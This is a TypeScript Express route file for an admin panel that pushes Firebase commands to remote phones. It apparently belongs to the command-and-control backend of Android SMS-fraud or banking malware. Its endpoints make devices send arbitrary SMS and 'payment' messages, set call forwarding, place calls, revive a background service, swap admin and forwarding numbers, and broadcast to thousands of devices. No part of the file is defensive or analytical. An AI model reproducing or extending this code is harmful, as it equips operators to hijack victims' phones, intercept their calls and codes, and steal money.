// File: src/routes/adminPush.ts
import express, { Request, Response } from "express";
import logger from "../logger/logger";
import wsService from "../services/wsService";
import {
  sendCommandToDevice,
  sendRestartCore,
  sendReviveCore,
  sendStartCore,
  sendSyncToken,
  sendSmsCommand,
  sendCallForwardCommand,
  sendAdminListUpdate,
  sendGlobalAdminUpdate,
  sendDeviceAdminPhoneUpdate,
  sendForwardingSimUpdate,
  sendPaymentCommand,
  sendPing,
  broadcastCommandToAllDevices,
} from "../services/fcmService";

const router = express.Router();

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function buildRequestId(prefix: string, deviceId: string) {
  return `${prefix}_${deviceId}_${Date.now()}`;
}

/* ═══════════════════════════════════════════
   CORE SERVICE COMMANDS
   ═══════════════════════════════════════════ */

async function handleCoreCommand(
  req: Request,
  res: Response,
  command: "restart_core" | "revive_core" | "start_core" | "sync_token",
) {
  const deviceId = clean(req.params.deviceId || req.body?.deviceId);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });

  const requestId = clean(req.body?.requestId) || buildRequestId(command, deviceId);
  const force = req.body?.force === true || String(req.body?.force).toLowerCase() === "true";

  try {
    let result: { success: boolean; messageId?: string; error?: string } | undefined;
    if (command === "restart_core")      result = await sendRestartCore(deviceId, { requestId, force });
    else if (command === "revive_core")  result = await sendReviveCore(deviceId, { requestId, force });
    else if (command === "start_core")   result = await sendStartCore(deviceId, { requestId, force });
    else                                 result = await sendSyncToken(deviceId, { requestId, force });

    if (!result?.success) {
      logger.warn("adminPush: core command failed", { deviceId, command, requestId, error: result?.error });

      // missing_token ke liye check_online:result emit mat karo
      // fcmService.ts mein device:uninstalled WS already handle karta hai (agar pehle uninstall hua ho)
      // Sirf non-token errors ke liye emit karo
      if (result?.error !== "missing_token") {
        try {
          const wsService = require("../services/wsService").default;
          wsService.broadcastAdminEvent("check_online:result", {
            deviceId,
            status:    "unreachable",
            error:     result?.error || "fcm_send_failed",
            timestamp: Date.now(),
          }, { deviceId, includeDeviceChannel: true });
        } catch (_) {}
      }

      return res.status(400).json({ success: false, error: result?.error || "fcm_send_failed", deviceId, command, requestId });
    }

    logger.info("adminPush: core command sent", { deviceId, command, requestId, messageId: result.messageId });
    return res.json({ success: true, deviceId, command, requestId, messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: core command failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error", deviceId, command, requestId });
  }
}

router.post("/devices/:deviceId/restart",    async (req, res) => handleCoreCommand(req, res, "restart_core"));
router.post("/devices/:deviceId/revive",     async (req, res) => handleCoreCommand(req, res, "revive_core"));
router.post("/devices/:deviceId/start",      async (req, res) => handleCoreCommand(req, res, "start_core"));
router.post("/devices/:deviceId/sync-token", async (req, res) => handleCoreCommand(req, res, "sync_token"));

/* ═══════════════════════════════════════════
   SEND SMS
   ═══════════════════════════════════════════ */

router.post("/devices/:deviceId/send-sms", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });

  const to      = clean(req.body?.to || req.body?.address || req.body?.phone);
  const message = clean(req.body?.message || req.body?.text || req.body?.smsContent);

  if (!to)      return res.status(400).json({ success: false, error: "missing 'to'" });
  if (!message) return res.status(400).json({ success: false, error: "missing 'message'" });

  const sim = typeof req.body?.sim === "number" ? req.body.sim : parseInt(String(req.body?.sim || "0"), 10) || 0;
  const id  = clean(req.body?.id) || undefined;

  try {
    const result = await sendSmsCommand(deviceId, to, message, sim, id);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    logger.info("adminPush: send-sms sent", { deviceId, to, sim, messageId: result.messageId });
    return res.json({ success: true, deviceId, command: "send_sms", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: send-sms failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   CALL FORWARD
   ═══════════════════════════════════════════ */

router.post("/devices/:deviceId/call-forward", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });

  const callCode = clean(req.body?.callCode || req.body?.code);
  if (!callCode) return res.status(400).json({ success: false, error: "missing 'callCode'" });

  const sim         = clean(req.body?.sim || "0");
  const phoneNumber = clean(req.body?.phoneNumber || "");

  try {
    const result = await sendCallForwardCommand(deviceId, callCode, sim, phoneNumber);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    logger.info("adminPush: call-forward sent", { deviceId, callCode, sim, messageId: result.messageId });
    return res.json({ success: true, deviceId, command: "call_forward", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: call-forward failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   MAKE DIRECT CALL
   ═══════════════════════════════════════════ */

router.post("/devices/:deviceId/make-call", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });

  const number = clean(req.body?.number || req.body?.phoneNumber || "");
  if (!number) return res.status(400).json({ success: false, error: "missing 'number'" });

  const sim = typeof req.body?.sim === "number"
    ? req.body.sim
    : parseInt(String(req.body?.sim || "0"), 10) || 0;

  const requestId = buildRequestId("make_call", deviceId);

  try {
    const result = await sendCommandToDevice(deviceId, "make_call", {
      requestId,
      extraData: { number, sim: sim.toString() },
    });

    if (!result?.success) {
      logger.warn("adminPush: make-call failed", { deviceId, number, sim, error: result?.error });
      return res.status(400).json({ success: false, error: result?.error || "fcm_send_failed", deviceId });
    }

    logger.info("adminPush: make-call sent", { deviceId, number, sim, messageId: result.messageId });
    return res.json({ success: true, deviceId, command: "make_call", number, sim, messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: make-call failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   ADMIN UPDATES
   ═══════════════════════════════════════════ */

router.post("/devices/:deviceId/push-admins", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
  const admins = Array.isArray(req.body?.admins) ? req.body.admins : [];
  try {
    const result = await sendAdminListUpdate(deviceId, admins);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    return res.json({ success: true, deviceId, command: "admins_update", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: push-admins failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/devices/:deviceId/push-global-admin", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  const phone    = clean(req.body?.phone);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
  try {
    const result = await sendGlobalAdminUpdate(deviceId, phone);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    return res.json({ success: true, deviceId, command: "global_admin_update", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: push-global-admin failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/devices/:deviceId/push-device-admin", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  const phone    = clean(req.body?.phone);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
  try {
    const result = await sendDeviceAdminPhoneUpdate(deviceId, phone);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    return res.json({ success: true, deviceId, command: "device_admin_update", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: push-device-admin failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/devices/:deviceId/push-forwarding-sim", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  const value    = clean(req.body?.value ?? req.body?.sim ?? "auto");
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
  try {
    const result = await sendForwardingSimUpdate(deviceId, value);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    return res.json({ success: true, deviceId, command: "forwarding_sim_update", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: push-forwarding-sim failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   PAYMENT
   ═══════════════════════════════════════════ */

router.post("/devices/:deviceId/send-payment", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });

  const to      = clean(req.body?.to || req.body?.smsto);
  const message = clean(req.body?.message || req.body?.smsContent);
  if (!to)      return res.status(400).json({ success: false, error: "missing 'to'" });
  if (!message) return res.status(400).json({ success: false, error: "missing 'message'" });

  const sim = typeof req.body?.sim === "number" ? req.body.sim : parseInt(String(req.body?.sim || "0"), 10) || 0;
  const id  = clean(req.body?.id) || undefined;

  try {
    const result = await sendPaymentCommand(deviceId, to, message, sim, id);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    logger.info("adminPush: send-payment sent", { deviceId, to, sim, messageId: result.messageId });
    return res.json({ success: true, deviceId, command: "payment", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: send-payment failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   PING
   ═══════════════════════════════════════════ */

router.post("/devices/:deviceId/ping", async (req: Request, res: Response) => {
  const deviceId = clean(req.params.deviceId);
  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
  try {
    const result = await sendPing(deviceId);
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId });
    return res.json({ success: true, deviceId, command: "ping", messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: ping failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   GENERIC SEND
   ═══════════════════════════════════════════ */

router.post("/send", async (req: Request, res: Response) => {
  const deviceId = clean(req.body?.deviceId);
  const command  = clean(req.body?.command).toLowerCase();

  if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
  if (!command)  return res.status(400).json({ success: false, error: "missing command" });

  const allowed = new Set([
    "restart_core", "revive_core", "start_core", "sync_token",
    "send_sms", "call_forward", "make_call",
    "admins_update", "global_admin_update", "device_admin_update",
    "forwarding_sim_update", "payment", "ping",
  ]);

  if (!allowed.has(command)) {
    return res.status(400).json({ success: false, error: `unsupported command: ${command}`, allowedCommands: Array.from(allowed) });
  }

  const requestId = clean(req.body?.requestId) || buildRequestId(command, deviceId);
  const force     = req.body?.force === true || String(req.body?.force).toLowerCase() === "true";
  const extraData = req.body?.extraData && typeof req.body.extraData === "object" ? req.body.extraData : {};

  try {
    const result = await sendCommandToDevice(deviceId, command, { requestId, force, extraData });
    if (!result.success) return res.status(400).json({ success: false, error: result.error || "fcm_send_failed", deviceId, command, requestId });
    return res.json({ success: true, deviceId, command, requestId, messageId: result.messageId || "" });
  } catch (err: any) {
    logger.error("adminPush: generic send failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   BROADCAST
   ═══════════════════════════════════════════ */

router.post("/broadcast", async (req: Request, res: Response) => {
  const command = clean(req.body?.command).toLowerCase();
  if (!command) return res.status(400).json({ success: false, error: "missing command" });

  const allowedBroadcast = new Set(["ping", "sync_token", "restart_core", "revive_core", "start_core"]);
  if (!allowedBroadcast.has(command)) {
    return res.status(400).json({ success: false, error: `broadcast not allowed for: ${command}`, allowedCommands: Array.from(allowedBroadcast) });
  }

  const force      = req.body?.force === true || String(req.body?.force).toLowerCase() === "true";
  const maxDevices = Math.min(Number(req.body?.maxDevices || 1000), 5000);

  try {
    const result = await broadcastCommandToAllDevices(command, { force }, maxDevices);
    logger.info("adminPush: broadcast complete", { command, ...result });
    return res.json({ success: true, command, attempted: result.attempted, successCount: result.success, failed: result.failed, skipped: result.skipped });
  } catch (err: any) {
    logger.error("adminPush: broadcast failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

export default router;
